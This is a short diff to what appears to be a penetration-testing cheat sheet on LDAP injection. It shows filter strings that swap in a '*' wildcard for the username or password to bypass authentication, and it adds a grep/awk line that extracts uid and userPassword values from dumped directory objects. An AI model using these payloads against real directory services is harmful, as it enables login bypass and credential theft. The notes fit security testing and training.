@@ -1,10 +1,12 @@
 # LDAP Injection
 ```powershell
-(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
+(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password)) > domain_objects
 
-(&(objectClass=user)(sAMAccountName=$username = "*")(userPassword=$password))
+(&(objectClass=user)(sAMAccountName=$username = "*")(userPassword=$password)) > domain_objects
 
-(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password = "*"))
+(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password = "*")) > domain_objects
+
+grep -E "uid:|userPassword" domain_objects | paste - - | awk '{print $2, $4}'
 ```
 
 # Ldapsearch
